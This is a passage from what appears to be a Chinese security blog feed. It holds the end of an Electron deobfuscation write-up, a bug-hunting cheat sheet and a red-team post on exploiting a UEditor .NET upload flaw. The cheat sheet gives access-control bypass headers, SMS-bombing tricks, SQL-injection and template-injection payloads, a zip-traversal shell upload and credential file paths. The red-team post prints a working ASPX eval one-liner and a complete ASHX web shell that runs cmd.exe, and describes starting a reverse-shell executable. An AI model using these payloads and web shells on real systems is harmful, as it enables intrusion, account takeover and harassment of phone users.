class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">_0x5bc29b</span>(-<span class="hljs-number">310</span>, -<span class="hljs-number">327</span>, -<span class="hljs-number">203</span>, -<span class="hljs-number">271</span>, <span class="hljs-string">&quot;PVAS&quot;</span>) + <span class="hljs-title function_">_0x2129cf</span>(<span class="hljs-number">526</span>, <span class="hljs-string">&quot;IVdS&quot;</span>, <span class="hljs-number">443</span>, <span class="hljs-number">392</span>, <span class="hljs-number">439</span>) ==&gt; <span class="hljs-string">&#x27;toString&#x27;</span><br><span class="hljs-title function_">_0x5852f4</span>(<span class="hljs-number">989</span>, <span class="hljs-number">1150</span>, <span class="hljs-number">955</span>, <span class="hljs-number">1088</span>, <span class="hljs-string">&quot;l@Ju&quot;</span>) + <span class="hljs-string">&quot;h&quot;</span> ==&gt; <span class="hljs-string">&#x27;search&#x27;</span><br><span class="hljs-title function_">_0x5bc29b</span>(<span class="hljs-number">84</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">69</span>, <span class="hljs-number">79</span>, <span class="hljs-string">&quot;u4os&quot;</span>) ==&gt; <span class="hljs-string">&#x27;uawfM&#x27;</span><br><span class="hljs-title function_">_0x2129cf</span>(<span class="hljs-number">279</span>, <span class="hljs-string">&quot;uiYA&quot;</span>, <span class="hljs-number">254</span>, <span class="hljs-number">247</span>, <span class="hljs-number">428</span>) + <span class="hljs-title function_">_0x5bc29b</span>(-<span class="hljs-number">229</span>, <span class="hljs-number">25</span>, -<span class="hljs-number">135</span>, -<span class="hljs-number">55</span>, <span class="hljs-string">&quot;PVAS&quot;</span>) ==&gt; <span class="hljs-string">&#x27;toString&#x27;</span><br><span class="hljs-title function_">_0x5852f4</span>(<span class="hljs-number">1087</span>, <span class="hljs-number">1013</span>, <span class="hljs-number">946</span>, <span class="hljs-number">1105</span>, <span class="hljs-string">&quot;lz)0&quot;</span>) + <span class="hljs-title function_">_0x5bc29b</span>(<span class="hljs-number">208</span>, <span class="hljs-number">101</span>, <span class="hljs-number">98</span>, <span class="hljs-number">21</span>, <span class="hljs-string">&quot;lz)0&quot;</span>) + <span class="hljs-string">&quot;r&quot;</span> ==&gt; <span class="hljs-string">&#x27;constructor&#x27;</span><br><span class="hljs-title function_">_0x2129cf</span>(<span class="hljs-number">285</span>, <span class="hljs-string">&quot;b#3e&quot;</span>, <span class="hljs-number">379</span>, <span class="hljs-number">555</span>, <span class="hljs-number">433</span>) + <span class="hljs-string">&quot;h&quot;</span> ==&gt; <span class="hljs-string">&#x27;search&#x27;</span><br><span class="hljs-title function_">_0x5bc29b</span>(-<span class="hljs-number">93</span>, -<span class="hljs-number">192</span>, -<span class="hljs-number">239</span>, -<span class="hljs-number">277</span>, <span class="hljs-string">&quot;)Ua$&quot;</span>) ==&gt; <span class="hljs-string">&#x27;uawfM&#x27;</span><br></code></pre></td></tr></table></figure><p>综合起来就是：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">_0x3cd8b0[<span class="hljs-string">&#x27;toString&#x27;</span>]()[<span class="hljs-string">&#x27;search&#x27;</span>](_0x377802[<span class="hljs-string">&#x27;uawfM&#x27;</span>])[<span class="hljs-string">&#x27;toString&#x27;</span>]()[<span class="hljs-string">&#x27;constructor&#x27;</span>](_0x3cd8b0)[<span class="hljs-string">&#x27;search&#x27;</span>](_0x377802[<span class="hljs-string">&#x27;uawfM&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>因为<code>_0x377802</code>这个函数在上面有体现，还可以进一步替换：<code>_0x3cd8b0.toString().search('(((.+)+)+)+$').toString()</code></p><p>这个表达式的语义是，<code>_0x377802.toString()</code>把函数字符串输出，然后正则匹配<code>(((.+)+)+)+$</code>规则，之后输出字符串。但是通过我们调试可以发现，这个字符串是肯定输出不出来的，因为卡住了……</p><p>经过测试，发现这个语句是一个<strong>基于正则表达式的拒绝服务</strong>，如果字符串里有回车，第一行正文长度大于14个字符的情况下，就拒绝响应。</p><p><img src="/2022/06/28/%E6%9F%90Electron%E5%BA%94%E7%94%A8%E7%9A%84JS%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B/image-20220701105821984.png" alt></p><p>直接注释掉这个函数，就可以看到最后的曙光：</p><p><img src="/2022/06/28/%E6%9F%90Electron%E5%BA%94%E7%94%A8%E7%9A%84JS%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B/image-20220629205640705.png" alt></p><p>这里错误信息表示我没有<code>electron</code>模块，是因为我这里没有进行环境配置（使用混淆代码直接进行调试会发现相同的错误）。如果配置好electron环境后，就可以发现应用打开了。</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞挖掘CheatSheet</title>
    <link href="/2022/06/26/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98CheatSheet/"/>
    <url>/2022/06/26/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98CheatSheet/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言">0x00 前言</h2><p>漏洞挖掘技巧的一个小备份，<strong>打√表示技巧成功测试过的。</strong></p><h2 id="0x01-逻辑漏洞">0x01 逻辑漏洞</h2><h3 id="未授权接口">未授权接口</h3><ol><li><p>一般app.js为主文件，JS格式化后一行一行看。如果有混淆可以用jsnice反混淆一下。</p></li><li><p>前端的JS和登录后的JS可能不一样，可以互相拼接尝试。</p></li><li><p>通过ctrl+F搜索url，path，location等关键词，或者搜索routes,data,home,secret等。 [√]</p></li><li><p>访问网站时预加载的js文件可能不是全部，可以ctrl+F搜索.js等关键词。</p></li><li><p>如果接口提示缺少参数，如{msg：params error}，可尝使用字典模糊测试构造参数，进一步攻击。 [√]</p></li><li><p>后台登陆后js文件也可以看一看。 [√]</p></li><li><p>针对Webpack等前端打包工具：<a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a><br>专门针对前端vue框架的JavaFx图形化GUI漏洞扫描工具：<a href="https://github.com/zangcc/Aakian-v1.0">https://github.com/zangcc/Aakian-v1.0</a><br>前端加密Fuzz插件：<a href="https://github.com/c0ny1/jsEncrypter">https://github.com/c0ny1/jsEncrypter</a></p></li><li><p>常见接口：</p><table><thead><tr><th>添加</th><th>删除</th><th>修改</th><th>查询</th></tr></thead><tbody><tr><td>POST /api/module</td><td>DELETE /api/module/id</td><td>POST /api/module/modify</td><td>GET /api/module/list</td></tr><tr><td>PUT /api/module</td><td>GET /api/module/del?id=</td><td>POST /api/module</td><td>GET /api/module/all</td></tr><tr><td></td><td>POST /api/module/del</td><td></td><td></td></tr></tbody></table></li><li><p>以及其他常见未授权：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs html">#swagger<br><br>/swagger/<br>/api/swagger/<br>/swagger/ui/<br>/api/swagger/ui/<br>/swagger-ui.html/<br>/api/swagger-ui.html/<br>/user/swagger-ui.html/<br>/swagger/ui/<br>/api/swagger/ui/<br>/libs/swaggerui/<br>/api/swaggerui/<br>/swagger-resources/configuration/ui/<br>/swagger-resources/configuration/security/<br><br>#druid<br>/druid/index.html<br>/druid/sql.html<br>/druid/weburi.html<br>/druid/websession.html<br>/druid/weburi.json<br>/druid/websession.json<br>/druid/login.html<br><br>#其他<br>/debug/pprof/cmdline<br>/.DS_Stroe<br>/tenant/<br>/sources/<br>/actuator/env/<br>/graphql<br>/content/env<br>/logs/<br>/logs/access.log<br>/split/<br><br></code></pre></td></tr></table></figure></li><li><p>如果当前目录<a href="http://www/wwwxx/login.html%E6%97%A0%E6%B3%95%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E4%B8%8B%E5%8E%BB%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95%E8%BD%AC%E5%88%B0%E4%B8%8A%E5%B1%82%E7%9B%AE%E5%BD%95%E6%9F%A5%E7%9C%8Bhttp://www/wwwxx/%EF%BC%8C%E8%AE%BF%E9%97%AE%E6%97%B6%E9%9C%80%E8%A6%81%E5%85%B3%E6%B3%A8%E5%8A%A0%E8%BD%BD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85%E3%80%82">http://www/wwwxx/login.html无法进行渗透下去，可以尝试转到上层目录查看http://www/wwwxx/，访问时需要关注加载的数据包。</a>  [√]</p></li><li><p>接口程序溢出，int最大值为2147483647，可尝试使用该值进行整数溢出，观察现象。</p></li><li><p>API接口处，可以自己构造参数，POST形式传参，可以尝试构造为JSON格式，记得添加<code>content-type: application/json</code>，一些可尝试参数，page，size，id。</p></li></ol><h3 id="接口的403绕过tips">接口的403绕过tips</h3><h4 id="请求方法绕过">请求方法绕过</h4><p>如果某个请求方法无效，可以试试别的请求方法。</p><ul><li>GET /users/delete/VICTIM_ID  --&gt; 403 Forbidden</li><li>POST /users/delete/VICTIM_ID  --&gt; 200 OK</li></ul><h4 id="请求头绕过">请求头绕过</h4><p>请求标头包含了关于请求者或来源页面的一些信息，可以尝试添加或更改请求头来实现绕过。</p><ul><li>X-Original-URL: /auth/login</li><li>X-Rewrite-URL: /auth/login</li><li>ReFerer: <a href="https://xxx/auth/login">https://xxx/auth/login</a></li><li>X-Originating-IP: 127.0.0.1</li><li>X-Originating-IP: 127.0.0.1</li><li>X-Remote-IP: 127.0.0.1</li><li>X-Client-IP: 127.0.0.1</li><li>X-Forwarded-For: 127.0.0.1</li><li>X-Forwared-Host: 127.0.0.1</li><li>X-Host: 127.0.0.1</li><li>X-Custom-IP-Authorization: 127.0.0.1</li><li>更改Host头</li></ul><h4 id="路径绕过">路径绕过</h4><h5 id="路径穿越">路径穿越</h5><ul><li>POST /users/delete/MY_ID/…/VICTIM_ID</li><li>POST /users/delete/…;/delete/VICTIM_ID</li></ul><h5 id="大小写替换">大小写替换</h5><ul><li>GET /admin/profile --&gt; 401 Unauthorized</li><li>GET /ADMIN/profile --&gt; 200 OK</li></ul><h5 id="多版本API绕过-√">多版本API绕过  [√]</h5><ul><li>GET /v2/users_data/1234 --&gt; 403 Forbidden</li><li>GET /v1/users_data/1234 --&gt; 200 OK</li></ul><h4 id="参数污染">参数污染</h4><h5 id="针对同一参数给多个不同的值">针对同一参数给多个不同的值</h5><ul><li>GET /api_v1/messages?user_id=ATTACKER_ID&amp;user_id=VICTIM_ID</li><li>GET /api_v1/messages?user_id=VICTIM_ID&amp;user_id=ATTACKER_ID</li><li>GET /api_v1/messages?user_id[]=ATTACKER_ID&amp;user_id[]=VICTIM_ID</li><li>GET /api_v1/messages?user_id[]=VICTIM_ID&amp;user_id[]=ATTACKER_ID</li></ul><h5 id="无中生有，提供额外的ID值-√">无中生有，提供额外的ID值  [√]</h5><ul><li>GET /api_v1/messages --&gt; 200 OK</li><li>GET /api_v1/messages?user_id=victim_uuid --&gt; 200 OK</li></ul><h5 id="通配符替换参数值">通配符替换参数值</h5><ul><li>GET /api/users/&lt;user_id&gt;/ --&gt; GET /api/users/*</li></ul><h5 id="数字ID替换非数字参数">数字ID替换非数字参数</h5><ul><li>GET /file?id=90ri2xozifke29ikedawOd  --&gt; 200 OK</li><li>GET /file?id=302 --&gt; 200 OK</li></ul><h4 id="格式绕过">格式绕过</h4><h5 id="内容类型">内容类型</h5><ul><li>Content-type: application/xml  --&gt;  Content-type: application/json</li></ul><h5 id="文件类型">文件类型</h5><ul><li>GET /user_data/123 --&gt; 401 Unauthorized</li><li>GET /user_data/123.json --&gt; 200 OK</li></ul><h3 id="越权">越权</h3><ol><li><p>多注意cookie中，请求参数中，可疑的加密值，例如：id值，value值等，修改可能就很造成越权；如果加密值无法解密，有条件下可以尝试使用另一个账号的加密值替换看看。</p></li><li><p>POST提交数据中的name值，txtNumber值，id值，应用中心修改ROLE_1值，个人中心GET请求的参数值，还有其它可疑的参数等。</p></li><li><p>同一个请求包更换普通用户cookie或者token去请求看返回结果，是否跟管理员一样。</p></li><li><p>如果接口的响应包JSON中含有提交数据包中不包含的数据，可以尝试提交修改。比如修改个人资料界面，回显返回JSON数据显示手机或积分等数据，可以测试修改手机或积分。</p></li></ol><h3 id="登录逻辑">登录逻辑</h3><ol><li>尝试拦截响应包修改其中的ret值，看是否存在逻辑绕过的情况（一般可以尝试true、success、200、0、1、ok等）  [√√]</li><li>同一系统登录返回包复用</li></ol><h3 id="验证码">验证码</h3><ol><li>图片验证码可尝试设置为空，如：code=undefined</li><li>返回包可能会存在验证码，或者直接写到cookie里。  [√]</li><li>请求的验证码如果包含尺寸参数，可尝试拒绝服务攻击。</li><li>万能验证码，例如：四位数的时候，可能四个0000，6666，1111，8888，9999；六位数可能是000000，666666，111111，888888等。  [√]</li><li>[?]观察Cookie中，参数中是否有发送给用户的内容，可以尝试更改，可以构造钓鱼链接。</li><li>删除验证码或cookie里的值可以直接爆破账号密码  [√]</li><li>如果验证码有实效，可尝试一段时间内重复发送获取验证码，因为有实效，所以有可能会延长验证码的时长。</li><li>短位数验证码且无防护可以尝试爆破。 [√]</li></ol><h4 id="短信轰炸">短信轰炸</h4><ol><li>纵向短信轰炸<ul><li>短时间内多次重发数据包</li><li>多次加入手机号，例如phone=13333333333&amp;phone=133333333333，或者phone=13333333333,133333333333</li><li>修改cookie重放数据包</li><li>手机号前后加空格，86，086，0086，+86，0，00，/r,/n, +，以及特殊符号等  [√]</li><li>手机号输入邮箱，邮箱处输入手机号</li><li>请求参数更改大小写，或增加请求参数，例如&amp;id=1</li><li>多测试接口，登录处可能做了防护，但是找回密码处没做，或者注册流程中也没做</li><li>修改回显</li><li>位数不够，138888888889：12位经过短信网关取前11位，导致短信轰炸</li></ul></li><li>横向短信爆破：phone=13333333333,13888888888…  [√]</li><li>获取短信验证码时，用逗号隔开两个手机号，有可能两个手机号能获取到同一个验证码。  [√√]</li></ol><p>​</p><h2 id="0x02-数据库">0x02 数据库</h2><h3 id="Redis">Redis</h3><p>如果开放了redis服务（1234端口），可以尝试使用<code>/actuator/redis/info</code>语句看是否能读取敏感信息，如：<code>http://www.xxx.com:1234/actuator/redis/info</code></p><h3 id="SQL注入">SQL注入</h3><h4 id="Mysql">Mysql</h4><ol><li>可以尝试使用&amp;&amp;替换and，如：<code>' &amp;&amp; '1'='1</code>，<code>' %26%26 '1'='1</code>。</li><li>waf过滤了<code>=</code>，可尝试用<code>like</code>替代。如：<code>and 1 like 1</code></li></ol><h4 id="万能密码">万能密码</h4><ul><li>'=0#</li></ul><h2 id="0x03-信息搜集">0x03 信息搜集</h2><h3 id="资产">资产</h3><ol><li>在搜狗搜索中选择<code>微信</code>可以搜索相关企业相关公众号资产。</li><li>获取账号：文库，QQ群，github泄露，借/租/买账号。[√]</li><li>可以通过图标哈希收集资产。</li></ol><h3 id="字典">字典</h3><ol><li><p>拿baidu.cn举例，可以使用baidu生成字典，也可以使用生成字典,反正全称或者简称都可以尝试。</p></li><li><p>企业邮箱前缀也可以作为用户名或者密码的字典制作，如<a href="mailto:hx@huoxian.com">hx@huoxian.com</a>。</p></li><li><p>学号比较大的可能性是你的入学年份加上一系列编号；内部的工号可能与隶属部门关联，例如：老师可能是T2019001，t2019001。</p></li><li><p>还有人名可能也存在，如：zhangsan或者zs。</p></li><li><p><strong>密码喷洒是用来收集用户名的。</strong></p></li><li><p>dirsearch调优：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> dirsearch.py -f php,html,js -u https://target -t <span class="hljs-number">20</span> -r -R <span class="hljs-number">3</span> --recursion-status <span class="hljs-number">200</span>-<span class="hljs-number">403</span> --timeout <span class="hljs-number">3</span> --retries <span class="hljs-number">1</span> --random-agent -w ./dic/path<br></code></pre></td></tr></table></figure></li></ol><h3 id="口令复用">口令复用</h3><ol><li>通过上述步骤获取一个账号密码后，可以使用该账号和密码去碰撞别的系统。例如账号是zhangsan，密码是123456；可以拿zhangsan/123456去登录，还可以尝试zhangsan/zhangsan去登录。</li><li>通过登录进去后如果有相关敏感信息，比如出生日期，手机号，身份证，可以尝试搜索资产看看有没有系统默认密码尝试去登录；还可以拿敏感信息去生成相关字典。</li></ol><h3 id="威胁情报">威胁情报</h3><ol><li>网盘<ol><li>可以通过企业名+关键词的形式进行排查<ol><li>常见关键词：合同、设计图纸、身份证、花名册、通讯录、报表、投标文件、入职</li></ol></li><li>情报提交时说明网盘链接和截图，方便厂商排查</li></ol></li><li>搜索引擎<ol><li>关键词：机密等级、身份证号、PDF、index of、Backup、sfzh</li></ol></li></ol><h3 id="敏感路径">敏感路径</h3><p>结合<code>任意文件读取</code>或<code>任意文件下载</code>漏洞使用。</p><h4 id="Linux">Linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">/root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去<br>/root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub<br>/root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥<br>/root/.ssh/known_hosts<br>//ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。<br>/etc/passwd // 账户信息<br>/etc/shadow // 账户密码文件<br>/etc/my.cnf //mysql 配置文件<br>/etc/httpd/conf/httpd.conf // Apache配置文件<br>/etc/redhat-release 系统版本<br>/root/.bash_history //用户历史命令记录文件<br>/root/.mysql_history //mysql历史命令记录文件<br>/var/lib/mlocate/mlocate.db //全文件路径<br>/proc/self/fd/fd[0-9]*(文件标识符)<br>/proc/mounts //记录系统挂载设备<br>/porc/config.gz //内核配置文件<br>/porc/self/cmdline //当前进程的cmdline参数<br>/proc/sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid<br>/proc/pid/cmdline 则可以看到对应pid进程的完整命令行。<br>/proc/net/fib_trie 内网IP<br>/proc/self/environ 环境变量<br>/proc/self/loginuid 当前用户<br></code></pre></td></tr></table></figure><h2 id="0x04-文件上传">0x04 文件上传</h2><p>Zip目录穿越实现文件上传[√]：</p><ol><li>在Linux系统下，在shell的当前目录新建若干个文件夹</li><li>进入到文件内，使用命令<code>zip shell.zip ../../../shell.php</code>将shell打包进zip</li><li>上传zip，观察shell是否实现穿越</li></ol><h2 id="0x05-其他">0x05 其他</h2><ol><li>Gitlab平台漏洞 - CVE-2020-10977</li><li>模板注入：<code>以Python为例，列出当前目录下所有文件的Payload：&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')&#125;&#125;</code></li><li>如果泄露<strong>阿里云的 AKSK</strong>，可以使用AKSKtools工具进一步利用。<code>https://xz.aliyun.com/t/8429</code></li><li>最短xss测试：<s>a</s></li></ol><h2 id="0x06-参考">0x06 参考</h2><p><a href="https://www.t00ls.com/redirect-66194.html#lastpost">SRC常用思路 - 原创文章发布(Original Article) - T00LS | 低调求发展 - 潜心习安全</a></p><p><a href="https://github.com/Power7089/PenetrationTest-Tips">Power7089/PenetrationTest-Tips: 渗透测试，渗透测试小技巧，渗透测试Tips，师傅们跟我一起维护更新吧~ (github.com)</a></p><p><a href="https://blog.csdn.net/qq_45244158/article/details/123204757">越权漏洞(IDOR)测试技巧_culprits的博客-CSDN博客_接口越权测试</a></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Aspx马如何执行命令</title>
    <link href="/2022/06/24/Aspx%E9%A9%AC%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/06/24/Aspx%E9%A9%AC%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-简短的前言">0x01 简短的前言</h2><p>南方某市hvv，某某系统直接弱口令杀进去……</p><h2 id="0x02-UEditor-1-4-3文件上传">0x02 UEditor 1.4.3文件上传</h2><p>进后台之后，看到一个富文本编辑器，爆路径发现是Ueditor编辑器。搜了下有个文件上传漏洞，存在于<strong>1.4.3.3</strong>、<strong>1.5.0</strong>和<strong>1.3.6</strong>版本中，并且只有**.NET**版本受该漏洞影响。黑客可以利用该漏洞上传木马，执行命令控制服务器。</p><p>*该漏洞是由于上传文件时，使用的CrawlerHandler类未对文件类型进行检验，导致了任意文件上传。1.4.3.3和1.5.0版本利用方式稍有不同，1.4.3.3需要一个能正确解析的域名。而1.5.0用IP和普通域名都可以。*相对来说1.5.0版本更加容易触发此漏洞；而在1.4.3.3版本中攻击者需要提供一个正常的域名地址就可以绕过判断；</p><p><img src="/2022/06/24/Aspx%E9%A9%AC%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/image-20220625092729950.png" alt></p><p>其中<code>source[]=</code>后跟的地址是你的公网服务器地址，其中要先把图片马上传到公网服务器上，然后payload后加<code>?.aspx</code>之类的任意后缀，如图所示。</p><p>这里传是传上去了，但是不能直接用蚁剑连接，显示连接被重置。这里用一句话测试下能不能执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asp">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%Response.Write(eval(Request.Item[&quot;hello&quot;],&quot;unsafe&quot;));%&gt;<br>var date = new Date;<br></code></pre></td></tr></table></figure><p>显示时间：<code>var date = new Date;</code></p><p><img src="/2022/06/24/Aspx%E9%A9%AC%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/image-20220625094133498.png" alt></p><p>爆破目录：<code>Server.MapPath(“./&quot;)</code></p><p><img src="/2022/06/24/Aspx%E9%A9%AC%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/image-20220625094210390.png" alt></p><p><strong>然后<code>var cmd = ExecuteCommand(&quot;cmd.exe&quot;, &quot;/c whoami&quot;);</code>没有执行成功，可能是因为有防护的原因。</strong></p><p>最后传上去了一个ashx马，可以执行，但是限制了<code>whoami</code>、<code>net user</code>等部分命令，可以使用<code>start</code>命令。所以上传反弹exe文件，再start一下就可shell。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c#">&lt;% @ webhandler language=<span class="hljs-string">&quot;C#&quot;</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;AverageHandler&quot;</span> %&gt;<span class="hljs-keyword">using</span> System;<span class="hljs-keyword">using</span> System.Web;<span class="hljs-keyword">using</span><br>System.Diagnostics;<span class="hljs-keyword">using</span> System.IO;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AverageHandler</span> : <span class="hljs-title">IHttpHandler</span>&#123; <span class="hljs-comment">/* .Net requires this to be implemented */</span> <span class="hljs-keyword">public</span> <span class="hljs-built_in">bool</span> IsReusable &#123; <br><span class="hljs-keyword">get</span> &#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; &#125; &#125;<br> <span class="hljs-comment">/* main executing code */</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ProcessRequest</span>(<span class="hljs-params">HttpContext ctx</span>)</span> &#123; Uri url = <span class="hljs-keyword">new</span><br>Uri(HttpContext.Current.Request.Url.Scheme + <span class="hljs-string">&quot;://&quot;</span> + HttpContext.Current.Request.Url.Authority +<br>HttpContext.Current.Request.RawUrl); <span class="hljs-built_in">string</span> command = HttpUtility.ParseQueryString(url.Query).Get(<span class="hljs-string">&quot;cmd&quot;</span>);<br> ctx.Response.Write(<span class="hljs-string">&quot;&lt;form method=&#x27;GET&#x27;&gt;Command: &lt;input name=&#x27;cmd&#x27; value=&#x27;&quot;</span>+command+<span class="hljs-string">&quot;&#x27;&gt;&lt;input type=&#x27;submit&#x27;</span><br><span class="hljs-string">value=&#x27;Run&#x27;&gt;&lt;/form&gt;&quot;</span>); ctx.Response.Write(<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>); ctx.Response.Write(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br> <span class="hljs-comment">/* command execution and output retrieval */</span> ProcessStartInfo psi = <span class="hljs-keyword">new</span> ProcessStartInfo(); psi.FileName<br>= <span class="hljs-string">&quot;cmd.exe&quot;</span>; psi.Arguments = <span class="hljs-string">&quot;/c &quot;</span>+command; psi.RedirectStandardOutput = <span class="hljs-literal">true</span>; psi.UseShellExecute =<br><span class="hljs-literal">false</span>; Process p = Process.Start(psi); StreamReader stmrdr = p.StandardOutput; <span class="hljs-built_in">string</span> s =<br>stmrdr.ReadToEnd(); stmrdr.Close();<br> ctx.Response.Write(System.Web.HttpUtility.HtmlEncode(s)); ctx.Response.Write(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>); <br>ctx.Response.Write(<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>); ctx.Response.Write(<span class="hljs-string">&quot;By &lt;a href=&#x27;http://www.twitter.com/Hypn&#x27;&gt;@Hypn&lt;/a&gt;, for</span><br><span class="hljs-string">educational purposes only.&quot;</span>); &#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/06/24/Aspx%E9%A9%AC%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/image-20220625094422838.png" alt></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>红队</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习</tag>
      
      <tag>红队</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于重置博客的注意事项</title>
    <link href="/2022/06/24/%E5%85%B3%E4%BA%8E%E9%87%8D%E7%BD%AE%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"/>
    <url>/2022/06/24/%E5%85%B3%E4%BA%8E%E9%87%8D%E7%BD%AE%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言">0x00 前言</h2><p>因为原来博客的排版问题，怎么修都无济于事……所以我有了重置博客的想法，写这篇文章特此记录。</p><h2 id="0x01-遇到的问题">0x01 遇到的问题</h2><p>基本的部署过程和初次部署是差不多的，这里就说下需要注意的一些问题。</p><div class="note note-info">            <p>部署方法：<a href="https://blog.csdn.net/weixin_39582737/article/details/110667585">(hexo+git+github+域名搭建个人博客提示404_hexo在GitHub上搭建个人博客_weixin_39582737的博客-CSDN博客</a></p>          </div><h3 id="1-本地成功，域名显示github404">1. 本地成功，域名显示github404</h3><p><strong>Source</strong>文件夹里缺少<strong>CNAME</strong>文件，文件内容写域名。</p><h3 id="2-不显示图片，不正确的图片路径">2. 不显示图片，不正确的图片路径</h3><ol><li>找到<code>Hexo</code>下的<code>_config.yml</code>里的<code>post_asset_folder</code>，把这个选项从<code>false</code>改成<code>true</code></li><li><strong>指定安装依赖：<code>npm install https://github.com/xcodebuild/hexo-asset-image</code></strong></li><li><code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></li></ol><h3 id="3-文章加密">3. 文章加密</h3><p>按照<a href="https://github.com/D0n9X1n/hexo-blog-encrypt/blob/master/ReadMe.zh.md">hexo-blog-encrypt/ReadMe.zh.md at master · 